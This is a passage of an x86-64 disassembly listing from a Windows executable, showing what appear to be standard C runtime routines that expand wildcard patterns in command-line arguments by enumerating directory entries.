   1400071c9:	8b 18                	mov    (%rax),%ebx
   1400071cb:	e9 85 00 00 00       	jmp    0x140007255
   1400071d0:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   1400071d4:	48 3b e9             	cmp    %rcx,%rbp
   1400071d7:	76 42                	jbe    0x14000721b
   1400071d9:	38 5f 28             	cmp    %bl,0x28(%rdi)
   1400071dc:	74 0c                	je     0x1400071ea
   1400071de:	48 8b 4f 10          	mov    0x10(%rdi),%rcx
   1400071e2:	e8 ed e5 ff ff       	call   0x1400057d4
   1400071e7:	88 5f 28             	mov    %bl,0x28(%rdi)
   1400071ea:	48 8b cd             	mov    %rbp,%rcx
   1400071ed:	e8 9e f5 ff ff       	call   0x140006790
   1400071f2:	48 89 47 10          	mov    %rax,0x10(%rdi)
   1400071f6:	48 8b cb             	mov    %rbx,%rcx
   1400071f9:	48 f7 d8             	neg    %rax
   1400071fc:	1b d2                	sbb    %edx,%edx
   1400071fe:	f7 d2                	not    %edx
   140007200:	83 e2 0c             	and    $0xc,%edx
   140007203:	48 0f 44 cd          	cmove  %rbp,%rcx
   140007207:	85 d2                	test   %edx,%edx
   140007209:	0f 94 c0             	sete   %al
   14000720c:	88 47 28             	mov    %al,0x28(%rdi)
   14000720f:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   140007213:	85 d2                	test   %edx,%edx
   140007215:	0f 85 62 ff ff ff    	jne    0x14000717d
   14000721b:	48 8b 47 10          	mov    0x10(%rdi),%rax
   14000721f:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140007223:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140007228:	4c 8b c6             	mov    %rsi,%r8
   14000722b:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140007230:	33 d2                	xor    %edx,%edx
   140007232:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140007236:	41 8b ce             	mov    %r14d,%ecx
   140007239:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000723e:	e8 41 0a 00 00       	call   0x140007c84
   140007243:	48 63 c8             	movslq %eax,%rcx
   140007246:	85 c0                	test   %eax,%eax
   140007248:	0f 84 69 ff ff ff    	je     0x1400071b7
   14000724e:	48 ff c9             	dec    %rcx
   140007251:	48 89 4f 20          	mov    %rcx,0x20(%rdi)
   140007255:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000725a:	8b c3                	mov    %ebx,%eax
   14000725c:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140007261:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140007266:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   14000726b:	48 83 c4 40          	add    $0x40,%rsp
   14000726f:	41 5e                	pop    %r14
   140007271:	c3                   	ret
   140007272:	cc                   	int3
   140007273:	cc                   	int3
   140007274:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007279:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000727e:	55                   	push   %rbp
   14000727f:	56                   	push   %rsi
   140007280:	57                   	push   %rdi
   140007281:	41 54                	push   %r12
   140007283:	41 55                	push   %r13
   140007285:	41 56                	push   %r14
   140007287:	41 57                	push   %r15
   140007289:	48 8b ec             	mov    %rsp,%rbp
   14000728c:	48 83 ec 60          	sub    $0x60,%rsp
   140007290:	33 ff                	xor    %edi,%edi
   140007292:	48 8b d9             	mov    %rcx,%rbx
   140007295:	48 85 d2             	test   %rdx,%rdx
   140007298:	75 16                	jne    0x1400072b0
   14000729a:	e8 5d f0 ff ff       	call   0x1400062fc
   14000729f:	8d 5f 16             	lea    0x16(%rdi),%ebx
   1400072a2:	89 18                	mov    %ebx,(%rax)
   1400072a4:	e8 27 e6 ff ff       	call   0x1400058d0
   1400072a9:	8b c3                	mov    %ebx,%eax
   1400072ab:	e9 a0 01 00 00       	jmp    0x140007450
   1400072b0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400072b3:	48 89 3a             	mov    %rdi,(%rdx)
   1400072b6:	48 8b 01             	mov    (%rcx),%rax
   1400072b9:	f3 0f 7f 45 e0       	movdqu %xmm0,-0x20(%rbp)
   1400072be:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
   1400072c2:	48 85 c0             	test   %rax,%rax
   1400072c5:	74 56                	je     0x14000731d
   1400072c7:	48 8d 55 50          	lea    0x50(%rbp),%rdx
   1400072cb:	66 c7 45 50 2a 3f    	movw   $0x3f2a,0x50(%rbp)
   1400072d1:	48 8b c8             	mov    %rax,%rcx
   1400072d4:	40 88 7d 52          	mov    %dil,0x52(%rbp)
   1400072d8:	e8 c3 35 00 00       	call   0x14000a8a0
   1400072dd:	48 8b 0b             	mov    (%rbx),%rcx
   1400072e0:	48 85 c0             	test   %rax,%rax
   1400072e3:	75 10                	jne    0x1400072f5
   1400072e5:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   1400072e9:	45 33 c0             	xor    %r8d,%r8d
   1400072ec:	33 d2                	xor    %edx,%edx
   1400072ee:	e8 8d 01 00 00       	call   0x140007480
   1400072f3:	eb 0c                	jmp    0x140007301
   1400072f5:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   1400072f9:	48 8b d0             	mov    %rax,%rdx
   1400072fc:	e8 07 03 00 00       	call   0x140007608
   140007301:	8b f0                	mov    %eax,%esi
   140007303:	85 c0                	test   %eax,%eax
   140007305:	75 09                	jne    0x140007310
   140007307:	48 83 c3 08          	add    $0x8,%rbx
   14000730b:	48 8b 03             	mov    (%rbx),%rax
   14000730e:	eb b2                	jmp    0x1400072c2
   140007310:	4c 8b 65 e8          	mov    -0x18(%rbp),%r12
   140007314:	4c 8b 7d e0          	mov    -0x20(%rbp),%r15
   140007318:	e9 f8 00 00 00       	jmp    0x140007415
   14000731d:	4c 8b 7d e0          	mov    -0x20(%rbp),%r15
   140007321:	4c 8b cf             	mov    %rdi,%r9
   140007324:	4c 8b 65 e8          	mov    -0x18(%rbp),%r12
   140007328:	49 8b d7             	mov    %r15,%rdx
   14000732b:	49 8b c4             	mov    %r12,%rax
   14000732e:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   140007332:	49 2b c7             	sub    %r15,%rax
   140007335:	4c 8b c7             	mov    %rdi,%r8
   140007338:	4c 8b f0             	mov    %rax,%r14
   14000733b:	49 c1 fe 03          	sar    $0x3,%r14
   14000733f:	49 ff c6             	inc    %r14
   140007342:	48 8d 48 07          	lea    0x7(%rax),%rcx
   140007346:	48 c1 e9 03          	shr    $0x3,%rcx
   14000734a:	4d 3b fc             	cmp    %r12,%r15
   14000734d:	48 0f 47 cf          	cmova  %rdi,%rcx
   140007351:	48 83 ce ff          	or     $0xffffffffffffffff,%rsi
   140007355:	48 85 c9             	test   %rcx,%rcx
   140007358:	74 25                	je     0x14000737f
   14000735a:	4c 8b 12             	mov    (%rdx),%r10
   14000735d:	48 8b c6             	mov    %rsi,%rax
   140007360:	48 ff c0             	inc    %rax
   140007363:	41 38 3c 02          	cmp    %dil,(%r10,%rax,1)
   140007367:	75 f7                	jne    0x140007360
   140007369:	49 ff c1             	inc    %r9
   14000736c:	48 83 c2 08          	add    $0x8,%rdx
   140007370:	4c 03 c8             	add    %rax,%r9
   140007373:	49 ff c0             	inc    %r8
   140007376:	4c 3b c1             	cmp    %rcx,%r8
   140007379:	75 df                	jne    0x14000735a
   14000737b:	4c 89 4d 50          	mov    %r9,0x50(%rbp)
   14000737f:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140007385:	49 8b d1             	mov    %r9,%rdx
   140007388:	49 8b ce             	mov    %r14,%rcx
   14000738b:	e8 f0 b8 ff ff       	call   0x140002c80
   140007390:	48 8b d8             	mov    %rax,%rbx
   140007393:	48 85 c0             	test   %rax,%rax
   140007396:	74 76                	je     0x14000740e
   140007398:	4a 8d 14 f0          	lea    (%rax,%r14,8),%rdx
   14000739c:	4d 8b f7             	mov    %r15,%r14
   14000739f:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   1400073a3:	48 8b c2             	mov    %rdx,%rax
   1400073a6:	48 89 55 58          	mov    %rdx,0x58(%rbp)
   1400073aa:	4d 3b fc             	cmp    %r12,%r15
   1400073ad:	74 56                	je     0x140007405
   1400073af:	48 8b cb             	mov    %rbx,%rcx
   1400073b2:	49 2b cf             	sub    %r15,%rcx
   1400073b5:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
   1400073b9:	4d 8b 06             	mov    (%r14),%r8
   1400073bc:	4c 8b ee             	mov    %rsi,%r13
   1400073bf:	49 ff c5             	inc    %r13
   1400073c2:	43 38 3c 28          	cmp    %dil,(%r8,%r13,1)
   1400073c6:	75 f7                	jne    0x1400073bf
   1400073c8:	48 2b d0             	sub    %rax,%rdx
   1400073cb:	49 ff c5             	inc    %r13
   1400073ce:	48 03 55 50          	add    0x50(%rbp),%rdx
   1400073d2:	4d 8b cd             	mov    %r13,%r9
   1400073d5:	48 8b c8             	mov    %rax,%rcx
   1400073d8:	e8 e3 33 00 00       	call   0x14000a7c0
   1400073dd:	85 c0                	test   %eax,%eax
   1400073df:	0f 85 83 00 00 00    	jne    0x140007468
   1400073e5:	48 8b 45 58          	mov    0x58(%rbp),%rax
   1400073e9:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   1400073ed:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
   1400073f1:	4a 89 04 31          	mov    %rax,(%rcx,%r14,1)
   1400073f5:	49 03 c5             	add    %r13,%rax
   1400073f8:	49 83 c6 08          	add    $0x8,%r14
   1400073fc:	48 89 45 58          	mov    %rax,0x58(%rbp)
   140007400:	4d 3b f4             	cmp    %r12,%r14
   140007403:	75 b4                	jne    0x1400073b9
   140007405:	48 8b 45 48          	mov    0x48(%rbp),%rax
   140007409:	8b f7                	mov    %edi,%esi
   14000740b:	48 89 18             	mov    %rbx,(%rax)
   14000740e:	33 c9                	xor    %ecx,%ecx
   140007410:	e8 bf e3 ff ff       	call   0x1400057d4
   140007415:	49 8b dc             	mov    %r12,%rbx
   140007418:	4d 8b f7             	mov    %r15,%r14
   14000741b:	49 2b df             	sub    %r15,%rbx
   14000741e:	48 83 c3 07          	add    $0x7,%rbx
   140007422:	48 c1 eb 03          	shr    $0x3,%rbx
   140007426:	4d 3b fc             	cmp    %r12,%r15
   140007429:	48 0f 47 df          	cmova  %rdi,%rbx
   14000742d:	48 85 db             	test   %rbx,%rbx
   140007430:	74 14                	je     0x140007446
   140007432:	49 8b 0e             	mov    (%r14),%rcx
   140007435:	e8 9a e3 ff ff       	call   0x1400057d4
   14000743a:	48 ff c7             	inc    %rdi
   14000743d:	4d 8d 76 08          	lea    0x8(%r14),%r14
   140007441:	48 3b fb             	cmp    %rbx,%rdi
   140007444:	75 ec                	jne    0x140007432
   140007446:	49 8b cf             	mov    %r15,%rcx
   140007449:	e8 86 e3 ff ff       	call   0x1400057d4
   14000744e:	8b c6                	mov    %esi,%eax
   140007450:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   140007457:	00 
   140007458:	48 83 c4 60          	add    $0x60,%rsp
   14000745c:	41 5f                	pop    %r15
   14000745e:	41 5e                	pop    %r14
   140007460:	41 5d                	pop    %r13
   140007462:	41 5c                	pop    %r12
   140007464:	5f                   	pop    %rdi
   140007465:	5e                   	pop    %rsi
   140007466:	5d                   	pop    %rbp
   140007467:	c3                   	ret
   140007468:	45 33 c9             	xor    %r9d,%r9d
   14000746b:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140007470:	45 33 c0             	xor    %r8d,%r8d
   140007473:	33 d2                	xor    %edx,%edx
   140007475:	33 c9                	xor    %ecx,%ecx
   140007477:	e8 74 e4 ff ff       	call   0x1400058f0
   14000747c:	cc                   	int3
   14000747d:	cc                   	int3
   14000747e:	cc                   	int3
   14000747f:	cc                   	int3
   140007480:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007485:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000748a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000748f:	57                   	push   %rdi
   140007490:	41 54                	push   %r12
   140007492:	41 55                	push   %r13
   140007494:	41 56                	push   %r14
   140007496:	41 57                	push   %r15
   140007498:	48 83 ec 30          	sub    $0x30,%rsp
   14000749c:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   1400074a0:	49 8b f9             	mov    %r9,%rdi
   1400074a3:	33 f6                	xor    %esi,%esi
   1400074a5:	4d 8b f0             	mov    %r8,%r14
   1400074a8:	4c 8b ea             	mov    %rdx,%r13
   1400074ab:	4c 8b e1             	mov    %rcx,%r12
   1400074ae:	48 ff c5             	inc    %rbp
   1400074b1:	40 38 34 29          	cmp    %sil,(%rcx,%rbp,1)
   1400074b5:	75 f7                	jne    0x1400074ae
   1400074b7:	ba 01 00 00 00       	mov    $0x1,%edx
   1400074bc:	49 8b c6             	mov    %r14,%rax
   1400074bf:	48 03 ea             	add    %rdx,%rbp
   1400074c2:	48 f7 d0             	not    %rax
   1400074c5:	48 3b e8             	cmp    %rax,%rbp
   1400074c8:	76 20                	jbe    0x1400074ea
   1400074ca:	8d 42 0b             	lea    0xb(%rdx),%eax
   1400074cd:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400074d2:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   1400074d7:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   1400074dc:	48 83 c4 30          	add    $0x30,%rsp
   1400074e0:	41 5f                	pop    %r15
   1400074e2:	41 5e                	pop    %r14
   1400074e4:	41 5d                	pop    %r13
   1400074e6:	41 5c                	pop    %r12
   1400074e8:	5f                   	pop    %rdi
   1400074e9:	c3                   	ret
   1400074ea:	4d 8d 78 01          	lea    0x1(%r8),%r15
   1400074ee:	4c 03 fd             	add    %rbp,%r15
   1400074f1:	49 8b cf             	mov    %r15,%rcx
   1400074f4:	e8 1f f2 ff ff       	call   0x140006718
   1400074f9:	48 8b d8             	mov    %rax,%rbx
   1400074fc:	4d 85 f6             	test   %r14,%r14
   1400074ff:	74 19                	je     0x14000751a
   140007501:	4d 8b ce             	mov    %r14,%r9
   140007504:	4d 8b c5             	mov    %r13,%r8
   140007507:	49 8b d7             	mov    %r15,%rdx
   14000750a:	48 8b c8             	mov    %rax,%rcx
   14000750d:	e8 ae 32 00 00       	call   0x14000a7c0
   140007512:	85 c0                	test   %eax,%eax
   140007514:	0f 85 d8 00 00 00    	jne    0x1400075f2
   14000751a:	4d 2b fe             	sub    %r14,%r15
   14000751d:	4a 8d 0c 33          	lea    (%rbx,%r14,1),%rcx
   140007521:	49 8b d7             	mov    %r15,%rdx
   140007524:	4c 8b cd             	mov    %rbp,%r9
   140007527:	4d 8b c4             	mov    %r12,%r8
   14000752a:	e8 91 32 00 00       	call   0x14000a7c0
   14000752f:	85 c0                	test   %eax,%eax
   140007531:	0f 85 bb 00 00 00    	jne    0x1400075f2
   140007537:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   14000753b:	44 8d 78 08          	lea    0x8(%rax),%r15d
   14000753f:	4c 8b 77 10          	mov    0x10(%rdi),%r14
   140007543:	49 3b ce             	cmp    %r14,%rcx
   140007546:	0f 85 9d 00 00 00    	jne    0x1400075e9
   14000754c:	48 39 37             	cmp    %rsi,(%rdi)
   14000754f:	75 2b                	jne    0x14000757c
   140007551:	41 8b d7             	mov    %r15d,%edx
   140007554:	8d 48 04             	lea    0x4(%rax),%ecx
   140007557:	e8 bc f1 ff ff       	call   0x140006718
   14000755c:	33 c9                	xor    %ecx,%ecx
   14000755e:	48 89 07             	mov    %rax,(%rdi)
   140007561:	e8 6e e2 ff ff       	call   0x1400057d4
   140007566:	48 8b 0f             	mov    (%rdi),%rcx
   140007569:	48 85 c9             	test   %rcx,%rcx
   14000756c:	74 42                	je     0x1400075b0
   14000756e:	48 8d 41 20          	lea    0x20(%rcx),%rax
   140007572:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   140007576:	48 89 47 10          	mov    %rax,0x10(%rdi)
   14000757a:	eb 6d                	jmp    0x1400075e9
   14000757c:	4c 2b 37             	sub    (%rdi),%r14
   14000757f:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140007586:	ff ff 7f 
   140007589:	49 c1 fe 03          	sar    $0x3,%r14
   14000758d:	4c 3b f0             	cmp    %rax,%r14
   140007590:	77 1e                	ja     0x1400075b0
   140007592:	48 8b 0f             	mov    (%rdi),%rcx
   140007595:	4b 8d 2c 36          	lea    (%r14,%r14,1),%rbp
   140007599:	48 8b d5             	mov    %rbp,%rdx
   14000759c:	4d 8b c7             	mov    %r15,%r8
   14000759f:	e8 48 06 00 00       	call   0x140007bec
   1400075a4:	48 85 c0             	test   %rax,%rax
   1400075a7:	75 22                	jne    0x1400075cb
   1400075a9:	33 c9                	xor    %ecx,%ecx
   1400075ab:	e8 24 e2 ff ff       	call   0x1400057d4
   1400075b0:	48 8b cb             	mov    %rbx,%rcx
   1400075b3:	e8 1c e2 ff ff       	call   0x1400057d4
   1400075b8:	be 0c 00 00 00       	mov    $0xc,%esi
   1400075bd:	33 c9                	xor    %ecx,%ecx
   1400075bf:	e8 10 e2 ff ff       	call   0x1400057d4
   1400075c4:	8b c6                	mov    %esi,%eax
   1400075c6:	e9 02 ff ff ff       	jmp    0x1400074cd
   1400075cb:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   1400075cf:	48 89 07             	mov    %rax,(%rdi)
   1400075d2:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   1400075d6:	48 8d 0c e8          	lea    (%rax,%rbp,8),%rcx
   1400075da:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   1400075de:	33 c9                	xor    %ecx,%ecx
   1400075e0:	e8 ef e1 ff ff       	call   0x1400057d4
   1400075e5:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   1400075e9:	48 89 19             	mov    %rbx,(%rcx)
   1400075ec:	4c 01 7f 08          	add    %r15,0x8(%rdi)
   1400075f0:	eb cb                	jmp    0x1400075bd
   1400075f2:	45 33 c9             	xor    %r9d,%r9d
   1400075f5:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400075fa:	45 33 c0             	xor    %r8d,%r8d
   1400075fd:	33 d2                	xor    %edx,%edx
   1400075ff:	33 c9                	xor    %ecx,%ecx
   140007601:	e8 ea e2 ff ff       	call   0x1400058f0
   140007606:	cc                   	int3
   140007607:	cc                   	int3
   140007608:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000760d:	55                   	push   %rbp
   14000760e:	56                   	push   %rsi
   14000760f:	57                   	push   %rdi
   140007610:	41 54                	push   %r12
   140007612:	41 55                	push   %r13
   140007614:	41 56                	push   %r14
   140007616:	41 57                	push   %r15
   140007618:	48 8d ac 24 d0 fd ff 	lea    -0x230(%rsp),%rbp
   14000761f:	ff 
   140007620:	48 81 ec 30 03 00 00 	sub    $0x330,%rsp
   140007627:	48 8b 05 0a fa 00 00 	mov    0xfa0a(%rip),%rax        # 0x140017038
   14000762e:	48 33 c4             	xor    %rsp,%rax
   140007631:	48 89 85 20 02 00 00 	mov    %rax,0x220(%rbp)
   140007638:	4d 8b e0             	mov    %r8,%r12
   14000763b:	48 8b f1             	mov    %rcx,%rsi
   14000763e:	48 bb 01 08 00 00 00 	movabs $0x200000000801,%rbx
   140007645:	20 00 00 
   140007648:	48 3b d1             	cmp    %rcx,%rdx
   14000764b:	74 22                	je     0x14000766f
   14000764d:	8a 02                	mov    (%rdx),%al
   14000764f:	2c 2f                	sub    $0x2f,%al
   140007651:	3c 2d                	cmp    $0x2d,%al
   140007653:	77 0a                	ja     0x14000765f
   140007655:	48 0f be c0          	movsbq %al,%rax
   140007659:	48 0f a3 c3          	bt     %rax,%rbx
   14000765d:	72 10                	jb     0x14000766f
   14000765f:	48 8b ce             	mov    %rsi,%rcx
   140007662:	e8 a1 36 00 00       	call   0x14000ad08
   140007667:	48 8b d0             	mov    %rax,%rdx
   14000766a:	48 3b c6             	cmp    %rsi,%rax
   14000766d:	75 de                	jne    0x14000764d
   14000766f:	44 8a 02             	mov    (%rdx),%r8b
   140007672:	41 80 f8 3a          	cmp    $0x3a,%r8b
   140007676:	75 1e                	jne    0x140007696
   140007678:	48 8d 46 01          	lea    0x1(%rsi),%rax
   14000767c:	48 3b d0             	cmp    %rax,%rdx
   14000767f:	74 15                	je     0x140007696
   140007681:	4d 8b cc             	mov    %r12,%r9
   140007684:	45 33 c0             	xor    %r8d,%r8d
   140007687:	33 d2                	xor    %edx,%edx
   140007689:	48 8b ce             	mov    %rsi,%rcx
   14000768c:	e8 ef fd ff ff       	call   0x140007480
   140007691:	e9 56 02 00 00       	jmp    0x1400078ec
   140007696:	41 80 e8 2f          	sub    $0x2f,%r8b
   14000769a:	33 ff                	xor    %edi,%edi
   14000769c:	41 80 f8 2d          	cmp    $0x2d,%r8b
   1400076a0:	77 0c                	ja     0x1400076ae
   1400076a2:	49 0f be c0          	movsbq %r8b,%rax
   1400076a6:	48 0f a3 c3          	bt     %rax,%rbx
   1400076aa:	b0 01                	mov    $0x1,%al
   1400076ac:	72 03                	jb     0x1400076b1
   1400076ae:	40 8a c7             	mov    %dil,%al
   1400076b1:	48 2b d6             	sub    %rsi,%rdx
   1400076b4:	48 89 7d a0          	mov    %rdi,-0x60(%rbp)
   1400076b8:	48 ff c2             	inc    %rdx
   1400076bb:	48 89 7d a8          	mov    %rdi,-0x58(%rbp)
   1400076bf:	f6 d8                	neg    %al
   1400076c1:	48 89 7d b0          	mov    %rdi,-0x50(%rbp)
   1400076c5:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400076ca:	48 89 7d b8          	mov    %rdi,-0x48(%rbp)
   1400076ce:	4d 1b ed             	sbb    %r13,%r13
   1400076d1:	48 89 7d c0          	mov    %rdi,-0x40(%rbp)
   1400076d5:	4c 23 ea             	and    %rdx,%r13
   1400076d8:	40 88 7d c8          	mov    %dil,-0x38(%rbp)
   1400076dc:	33 d2                	xor    %edx,%edx
   1400076de:	e8 71 d6 ff ff       	call   0x140004d54
   1400076e3:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1400076e8:	41 bf e9 fd 00 00    	mov    $0xfde9,%r15d
   1400076ee:	44 39 78 0c          	cmp    %r15d,0xc(%rax)
   1400076f2:	75 18                	jne    0x14000770c
   1400076f4:	40 38 7c 24 48       	cmp    %dil,0x48(%rsp)
   1400076f9:	74 0c                	je     0x140007707
   1400076fb:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140007700:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140007707:	45 8b c7             	mov    %r15d,%r8d
   14000770a:	eb 3a                	jmp    0x140007746
   14000770c:	e8 53 c6 ff ff       	call   0x140003d64
   140007711:	85 c0                	test   %eax,%eax
   140007713:	75 1b                	jne    0x140007730
   140007715:	40 38 7c 24 48       	cmp    %dil,0x48(%rsp)
   14000771a:	74 0c                	je     0x140007728
   14000771c:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140007721:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140007728:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000772e:	eb 16                	jmp    0x140007746
   140007730:	40 38 7c 24 48       	cmp    %dil,0x48(%rsp)
   140007735:	74 0c                	je     0x140007743
   140007737:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000773c:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140007743:	44 8b c7             	mov    %edi,%r8d
   140007746:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   14000774a:	48 8b ce             	mov    %rsi,%rcx
   14000774d:	e8 1e f8 ff ff       	call   0x140006f70
   140007752:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   140007756:	4c 8d 45 d0          	lea    -0x30(%rbp),%r8
   14000775a:	85 c0                	test   %eax,%eax
   14000775c:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140007760:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140007765:	48 0f 45 cf          	cmovne %rdi,%rcx
   140007769:	45 33 c9             	xor    %r9d,%r9d
   14000776c:	33 d2                	xor    %edx,%edx
   14000776e:	ff 15 14 e0 00 00    	call   *0xe014(%rip)        # 0x140015788
   140007774:	48 8b d8             	mov    %rax,%rbx
   140007777:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000777b:	75 17                	jne    0x140007794
   14000777d:	4d 8b cc             	mov    %r12,%r9
   140007780:	45 33 c0             	xor    %r8d,%r8d
   140007783:	33 d2                	xor    %edx,%edx
   140007785:	48 8b ce             	mov    %rsi,%rcx
   140007788:	e8 f3 fc ff ff       	call   0x140007480
   14000778d:	8b f8                	mov    %eax,%edi
   14000778f:	e9 47 01 00 00       	jmp    0x1400078db
   140007794:	4d 8b 74 24 08       	mov    0x8(%r12),%r14
   140007799:	4d 2b 34 24          	sub    (%r12),%r14
   14000779d:	49 c1 fe 03          	sar    $0x3,%r14
   1400077a1:	33 d2                	xor    %edx,%edx
   1400077a3:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   1400077a8:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400077ad:	48 89 7c 24 78       	mov    %rdi,0x78(%rsp)
   1400077b2:	48 89 7d 80          	mov    %rdi,-0x80(%rbp)
   1400077b6:	48 89 7d 88          	mov    %rdi,-0x78(%rbp)
   1400077ba:	48 89 7d 90          	mov    %rdi,-0x70(%rbp)
   1400077be:	40 88 7d 98          	mov    %dil,-0x68(%rbp)
   1400077c2:	e8 8d d5 ff ff       	call   0x140004d54
   1400077c7:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   1400077cc:	44 39 78 0c          	cmp    %r15d,0xc(%rax)
   1400077d0:	75 18                	jne    0x1400077ea
   1400077d2:	40 38 7c 24 68       	cmp    %dil,0x68(%rsp)
   1400077d7:	74 0c                	je     0x1400077e5
   1400077d9:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400077de:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   1400077e5:	45 8b c7             	mov    %r15d,%r8d
   1400077e8:	eb 3a                	jmp    0x140007824
   1400077ea:	e8 75 c5 ff ff       	call   0x140003d64
   1400077ef:	85 c0                	test   %eax,%eax
   1400077f1:	75 1b                	jne    0x14000780e
   1400077f3:	40 38 7c 24 68       	cmp    %dil,0x68(%rsp)
   1400077f8:	74 0c                	je     0x140007806
   1400077fa:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400077ff:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140007806:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000780c:	eb 16                	jmp    0x140007824
   14000780e:	40 38 7c 24 68       	cmp    %dil,0x68(%rsp)
   140007813:	74 0c                	je     0x140007821
   140007815:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000781a:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140007821:	44 8b c7             	mov    %edi,%r8d
   140007824:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140007829:	48 8d 4d fc          	lea    -0x4(%rbp),%rcx
   14000782d:	e8 b6 f8 ff ff       	call   0x1400070e8
   140007832:	4c 8b 7d 80          	mov    -0x80(%rbp),%r15
   140007836:	85 c0                	test   %eax,%eax
   140007838:	49 8b cf             	mov    %r15,%rcx
   14000783b:	48 0f 45 cf          	cmovne %rdi,%rcx
   14000783f:	80 39 2e             	cmpb   $0x2e,(%rcx)
   140007842:	75 11                	jne    0x140007855
   140007844:	8a 41 01             	mov    0x1(%rcx),%al
   140007847:	84 c0                	test   %al,%al
   140007849:	74 20                	je     0x14000786b
   14000784b:	3c 2e                	cmp    $0x2e,%al
   14000784d:	75 06                	jne    0x140007855
   14000784f:	40 38 79 02          	cmp    %dil,0x2(%rcx)
   140007853:	74 16                	je     0x14000786b
   140007855:	4d 8b cc             	mov    %r12,%r9
   140007858:	4d 8b c5             	mov    %r13,%r8
   14000785b:	48 8b d6             	mov    %rsi,%rdx
   14000785e:	e8 1d fc ff ff       	call   0x140007480
   140007863:	8b f8                	mov    %eax,%edi
   140007865:	85 c0                	test   %eax,%eax
   140007867:	75 5b                	jne    0x1400078c4
   140007869:	33 ff                	xor    %edi,%edi
   14000786b:	40 38 7d 98          	cmp    %dil,-0x68(%rbp)
   14000786f:	74 08                	je     0x140007879
   140007871:	49 8b cf             	mov    %r15,%rcx
   140007874:	e8 5b df ff ff       	call   0x1400057d4
   140007879:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   14000787d:	48 8b cb             	mov    %rbx,%rcx
   140007880:	ff 15 0a df 00 00    	call   *0xdf0a(%rip)        # 0x140015790
   140007886:	41 bf e9 fd 00 00    	mov    $0xfde9,%r15d
   14000788c:	85 c0                	test   %eax,%eax
   14000788e:	0f 85 0d ff ff ff    	jne    0x1400077a1
   140007894:	49 8b 04 24          	mov    (%r12),%rax
   140007898:	49 8b 54 24 08       	mov    0x8(%r12),%rdx
   14000789d:	48 2b d0             	sub    %rax,%rdx
   1400078a0:	48 c1 fa 03          	sar    $0x3,%rdx
   1400078a4:	4c 3b f2             	cmp    %rdx,%r14
   1400078a7:	74 29                	je     0x1400078d2
   1400078a9:	49 2b d6             	sub    %r14,%rdx
   1400078ac:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   1400078b0:	4c 8d 0d 61 00 00 00 	lea    0x61(%rip),%r9        # 0x140007918
   1400078b7:	41 b8 08 00 00 00    	mov    $0x8,%r8d
